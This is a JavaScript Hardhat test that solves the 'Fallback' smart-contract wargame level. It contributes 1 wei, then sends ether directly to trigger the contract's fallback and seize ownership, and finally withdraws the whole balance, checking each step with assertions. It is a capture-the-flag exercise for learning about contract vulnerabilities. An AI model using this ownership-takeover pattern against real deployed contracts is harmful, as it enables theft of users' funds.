const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0xE3047e4C2D3b40c4a616CAD75F57A2f3bc948e0f"

describe("01 Fallback", function () {
    let player, challengeContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Fallback",
            CONTRACT_ADDRESS,
            player
        )
        const ownerBefore = await challengeContract.owner()
        assert.notEqual(ownerBefore.toString(), player.address.toString())
        const ownerBalance = await challengeContract.contributions(ownerBefore)
        assert.equal(ownerBalance.toString(), ethers.utils.parseEther("1000"))
    })

    it("Execution", async function () {
        await challengeContract.contribute({
            value: "1",
        })
        await player.sendTransaction({
            to: challengeContract.address,
            value: "1",
        })
        const txResponse = await challengeContract.withdraw()
        await txResponse.wait(1)
    })

    after(async function () {
        const ownerAfter = await challengeContract.owner()
        assert.equal(ownerAfter.toString(), player.address.toString())
        const txBalance = await ethers.provider.getBalance(
            challengeContract.address
        )
        assert.equal(txBalance.toString(), "0")
    })
})
